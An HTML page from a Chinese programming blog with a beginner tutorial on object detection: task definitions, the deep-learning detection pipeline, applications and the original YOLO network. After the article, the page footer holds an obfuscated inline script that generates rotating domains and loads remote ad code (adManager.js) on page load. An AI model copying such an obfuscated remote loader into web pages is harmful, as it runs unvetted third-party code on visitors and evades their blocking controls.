<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>从零开始学习目标检测：YOLO算法详解 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">从零开始学习目标检测：YOLO算法详解</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="markdown_views prism-dracula">
                    
                        
                    
                    <p><img src="https://images2.imgbox.com/1e/61/eoKC15yZ_o.png" alt="请添加图片描述"></p> 
<hr> 
<h1>
<a id="YOLO_3"></a>从零开始学习目标检测：YOLO算法详解</h1> 
<p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul>
<li><a href="#YOLO_3">从零开始学习目标检测：YOLO算法详解</a></li>
<li>
<ul>
<li><a href="#1__14">1. ?什么是目标检测?</a></li>
<li><a href="#2_37">2.?传统的目标检测与基于深度学习的目标检测</a></li>
<li><a href="#3_63">3.?目标检测算法的工作流程</a></li>
<li><a href="#4_97">4.?目标检测可以干什么？</a></li>
<li><a href="#5YOLO_113">5.?什么是YOLO</a></li>
</ul>
 </li>
</ul>
</div>
<p></p> 
<hr> 
<p>在过去的十年中，深度学习技术的发展引起了极大的关注，并成为人工智能领域中不可或缺的技术之一。深度学习在计算机视觉领域的应用越来越广泛，其中目标检测是备受关注的领域之一。目标检测是指在图像或视频中检测出目标的位置和边界框，然后对目标进行分类或识别。目标检测在计算机视觉领域中具有非常重要的应用，如目标跟踪、目标检索、视频监控、图像字幕、图像分割、医学影像等等。除了这些应用场景外，目标检测还可以应用于自动驾驶、机器人视觉、智能安防等领域。</p> 
<hr> 
<h2>
<a id="1__14"></a>1. ?什么是目标检测?</h2> 
<p>目标检测、分类和分割是计算机视觉领域中的三个重要任务，它们在输入和输出上有所不同，具体区别如下：</p> 
<ul><li><strong>目标检测</strong></li></ul> 
<p>目标检测的目标是在图像或视频中检测出目标的位置和边界框，然后对目标进行分类或识别。这个任务需要同时完成目标的位置定位和分类任务。目标检测输出的结果包括目标的位置和类别。</p> 
<ul><li><strong>分类</strong></li></ul> 
<p>分类的目标是将输入图像或视频中的物体或场景分为不同的类别。分类任务只需要对整张图像或视频进行分析，输出结果是物体或场景所属的类别。</p> 
<ul><li><strong>分割</strong></li></ul> 
<p>分割的目标是将输入图像或视频中的每个像素分配到不同的语义类别，形成一个像素级别的标注结果。分割任务需要对整张图像或视频进行像素级别的分析，输出结果是一个标注图像，每个像素都被分配了一个类别。</p> 
<p>可以看出，目标检测是分类和分割的进一步扩展，需要同时完成物体位置的定位和分类任务。分类和分割通常只需要对整张图像或视频进行分析，而目标检测需要在图像中识别出物体的位置和边界框。在实际应用中，这三种任务通常会同时使用，以实现更精确和全面的图像分析和理解。</p> 
<hr> 
<h2>
<a id="2_37"></a>2.?传统的目标检测与基于深度学习的目标检测</h2> 
<p>目标检测方法通常可以分为基于机器学习和基于深度学习两类方法。</p> 
<ul><li><strong>基于机器学习的目标检测方法</strong></li></ul> 
<p>基于机器学习的目标检测方法通常使用传统的机器学习算法，例如支持向量机、<code>AdaBoost</code>和随机森林等。这些方法的基本思想是提取图像特征并使用分类器对特征进行分类，然后使用对象检测器检测目标。这些算法需要手动选择和提取图像特征，因此需要领域专家的知识和经验。</p> 
<p><img src="https://images2.imgbox.com/2b/10/8uWfGPVZ_o.png" alt="在这里插入图片描述"></p> 
<ul><li><strong>基于深度学习的目标检测方法</strong></li></ul> 
<p>基于深度学习的目标检测方法通常使用深度神经网络来自动学习特征并进行目标检测。目前比较流行的深度学习目标检测方法包括两类：基于区域提取的方法(两阶段检测方法)和单阶段检测方法。其中，基于区域提取的方法包括<code>R-CNN</code>、<code>Fast R-CNN</code>、<code>Faster R-CNN</code>和<code>Mask R-CNN</code>等，它们主要通过候选区域提取器生成目标候选区域，并使用CNN网络对每个候选区域进行特征提取和分类。而单阶段检测方法则直接从图像中提取目标位置和类别信息，例如<code>YOLO</code>和<code>SSD</code>等，它们可以实现更快速的检测速度。</p> 
<p><img src="https://images2.imgbox.com/93/05/eUEp1tCM_o.png" alt="在这里插入图片描述"></p> 
<hr> 
<h2>
<a id="3_63"></a>3.?目标检测算法的工作流程</h2> 
<p>基于深度学习的目标检测主要包括<strong>训练</strong>和<strong>测试</strong>两个部分。<strong>训练</strong>的主要目的是利用训练数据集进行检测网络的参数学习。<strong>测试</strong>的主要目的是在经过训练后，评估检测网络的性能表现。</p> 
<ul><li><strong>训练阶段</strong></li></ul> 
<ol>
<li>
<strong>数据预处理</strong>：在训练数据集中，包含了大量的视觉图像和标注信息，如物体位置和类别。数据预处理的目的是通过对训练数据集的增强来提升检测网络的检测能力。常用的数据增强技术包括图像翻转、缩放、均值归一化和色调变化等。这些技术可以增加训练数据的数量和多样性，从而提高检测器的泛化能力。</li>
<li>
<strong>检测网络</strong>：检测网络一般由基础骨干、特征融合和预测网络三个部分组成。基础骨干通常采用用于图像分类的深度卷积网络，如<code>AlexNet</code>、<code>VGGNet</code>、<code>ResNet</code>和<code>DenseNet</code>等。近期，基于<code>Transformer</code>的网络，如<code>ViT</code>、<code>Swin</code>和<code>PVT</code>等也开始被用于目标检测。在训练开始时，通常将在大规模图像分类数据库<code>ImageNet</code>上训练的预训练权重作为检测器骨干网络的初始权重。</li>
<li>
<strong>特征融合</strong>：特征融合是对基础骨干提取的特征进行融合，用于后续分类和回归。常见的特征融合方式是特征金字塔结构。</li>
<li>
<strong>预测网络</strong>：预测网络主要进行分类和回归等任务。在两阶段目标检测方法中，分类和回归通常采用全连接的方式，而在单阶段的方法中，分类和回归等通常采用全卷积的方式。检测器还需要一些初始化，如锚点框初始化、角点初始化和查询特征初始化等。</li>
<li>
<strong>标签分配与损失计算</strong>：标签分配的目的是为检测器预测提供真实值。在目标检测中，标签分配的准则包括交并比<code>(IoU)</code>准则、距离准则、似然估计准则和二分匹配等。基于标签分类的结果，采用损失函数计算分类和回归等任务的损失，并利用反向传播算法更新检测网络的权重。常用的分类损失函数有交叉熵损失函数、聚焦损失函数等，而回归损失函数有<code>L1</code>损失函数、平滑<code>L1</code>损失函数、交并比<code>IoU</code>损失函数、<code>GIoU(generalized IoU)</code>损失函数和<code>CIoU(complete-IoU)</code>损失函数等。</li>
<li>
<strong>非极大值抑制</strong>：在目标检测的输出结果中，可能会出现多个框或分割掩模与同一个物体相关联的情况，这些检测结果会产生冗余。因此需要使用非极大值抑制<code>(NMS)</code>技术，将多个重叠的检测结果进行筛选，只保留最有可能代表物体的检测结果。<code>NMS</code>的基本思想是通过比较检测结果的置信度得分，去除重叠框中得分较低的框，只保留得分最高的框。</li>
<li>
<strong>目标检测的评估指标</strong>：为了评估目标检测算法的性能，需要使用一些评估指标。常用的评估指标包括准确率<code>(Precision)</code>、召回率<code>(Recall)</code>、<code>F1</code>值、平均精度<code>(Average Precision，AP)</code>、均值召回率<code>(Mean Average Precision，mAP)</code>等。其中，<code>AP</code>是一种常用的评估指标，用于衡量检测器在不同置信度阈值下的性能表现。而<code>mAP</code>是<code>AP</code>的平均值，通常作为衡量整个检测算法性能的指标。<br> <img src="https://images2.imgbox.com/28/4c/LEhk0IrB_o.png" alt="在这里插入图片描述">
</li>
</ol> 
<ul><li><strong>测试阶段</strong></li></ul> 
<p>在测试阶段，首先需要输入一张待检测的图像。这张图像会被送入训练好的检测网络中进行处理，这个过程叫做前向传播<code>(forward propagation)</code>。在检测网络中，图像会被分类，确定图像中存在哪些物体，并输出每个物体的位置信息。这些位置信息通常表示为边界框<code>(bounding box)</code>，也可以表示为像素级的分割掩模<code>(segmentation mask)</code>，它们描述了物体在图像中的位置和大小。</p> 
<p>然而，在检测网络输出结果之后，可能会出现多个边界框或分割掩模与同一物体相关联的情况。这可能是因为图像中的物体形状、大小、角度等方面的变化，或者是因为图像的不同区域可能包含相同的物体。因此，需要对这些检测结果进行后处理，以便确定每个物体的最终边界框或分割掩模。</p> 
<p>这个后处理过程的目标是为每个物体保留一个检测结果，并去除其他冗余的检测结果。这个过程被称为非极大值抑制<code>(non-maximum suppression，NMS)</code>。它的基本思想是通过比较检测结果的分类得分和位置信息，为每个物体保留一个得分最高的检测结果。在执行 <code>NMS </code>之后，每个物体将仅对应一个边界框或分割掩模，这是最终的检测结果。</p> 
<p><img src="https://images2.imgbox.com/77/21/W6yqkG45_o.png" alt="在这里插入图片描述"></p> 
<hr> 
<h2>
<a id="4_97"></a>4.?目标检测可以干什么？</h2> 
<ol>
<li>
<strong>车辆和行人检测</strong>：自动驾驶汽车需要识别道路上的车辆和行人，并对它们的位置和速度进行准确的估计，以便做出正确的决策，例如避让障碍物或停车等。目标检测技术可以用于检测和跟踪道路上的车辆和行人，并估计它们的速度和方向。</li>
<li>
<strong>交通信号灯检测</strong>：自动驾驶汽车需要识别交通信号灯的状态，例如红灯或绿灯，以便决定是否停车或继续前行。目标检测技术可以用于检测和识别交通信号灯，并确定其状态。</li>
<li>
<strong>路标检测</strong>：自动驾驶汽车需要识别路标，例如标识路口、转弯或合并车道等的标志，以便正确地导航和做出决策。目标检测技术可以用于检测和识别各种路标，并确定它们的含义。</li>
<li>
<strong>障碍物检测</strong>：自动驾驶汽车需要检测和避免道路上的障碍物，例如路面上的水坑、石块或垃圾等。目标检测技术可以用于检测和跟踪道路上的各种障碍物，并提供避让策略。</li>
<li>
<strong>入侵检测</strong>：目标检测技术可以用于监控视频中的入侵者的自动检测和跟踪，例如未经授权进入建筑物或某个区域的人员。系统可以通过发送警报来及时通知安保人员并采取措施。</li>
<li>
<strong>丢失物品检测</strong>：目标检测技术可以用于监控视频中的丢失物品的自动检测和跟踪，例如钱包、手机或其他贵重物品。当系统检测到这些物品被遗失或被人拾起时，可以通过发送警报来通知相关人员。</li>
<li>
<strong>摔倒检测</strong>：目标检测技术可以用于监控视频中的摔倒事件的自动检测和跟踪，例如老年人或身体不便的人。系统可以通过发送警报来及时通知相关人员并采取措施。</li>
<li>
<strong>交通监控</strong>：目标检测技术可以用于交通监控视频中的车辆和行人的自动检测和跟踪，例如违法停车、超速行驶、路口违规等。系统可以通过发送警报来通知相关部门或管理人员。</li>
</ol> 
<hr> 
<h2>
<a id="5YOLO_113"></a>5.?什么是YOLO</h2> 
<p>论文地址：<a href="https://arxiv.org/pdf/1506.02640v5.pdf">https://arxiv.org/pdf/1506.02640v5.pdf</a></p> 
<p><img src="https://images2.imgbox.com/c5/f6/sIVNRO6j_o.png" alt="在这里插入图片描述"></p> 
<p><code>YOLO(You Only Look Once)</code>是一种目标检测算法，它在单个神经网络中同时完成对象检测和分类的任务。相比传统的对象检测方法，<code>YOLO</code>算法的速度更快，因为它只需要运行一次神经网络，而不是多次。</p> 
<p><code>YOLO</code>的卷积神经网络架构是来自<code>GoogleLeNet</code>模型，<code>YOLO</code>的网络有<code>24</code>层卷积和<code>2</code>层全连接，与<code>GoogLeNe</code>不同的地方在于作者在某些<code>3×3</code>的卷积层前用了<code>1×1</code>的卷积降维， 整体结构图如下图所示：</p> 
<p><img src="https://images2.imgbox.com/f3/57/9ja7b9X0_o.png" alt="在这里插入图片描述"></p> 
<p><code>YOLO</code>算法的核心思想是将目标检测问题转化为回归问题。它将图像划分为一个固定数量的网格（比如<code>7×7</code>），每个网格预测固定数量的边界框和它们的置信度和类别概率。边界框指的是目标在图像中的位置和大小，置信度表示边界框中是否存在目标，类别概率表示目标属于哪个类别。</p> 
<p>具体来说，<code>YOLO</code>算法将输入图像经过卷积神经网络提取特征后，得到一个<code>S×S×(B×5+C)</code>的张量。其中，<code>S</code>表示网格数量，<code>B</code>表示每个网格预测的边界框数量，<code>C</code>表示类别数量。张量中每个元素都表示一个边界框的信息，包括边界框的中心坐标、宽度、高度、置信度和类别概率。<code>YOLO</code>算法通过对张量进行解码，得到图像中所有目标的位置和类别。</p> 
<p><code>YOLO</code>算法的训练过程是基于交叉熵损失函数的反向传播。对于每个边界框，损失函数包括位置误差、置信度误差和类别误差。<code>YOLO</code>算法通过反向传播更新神经网络的参数，提高目标检测的准确率。</p> 
<hr>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>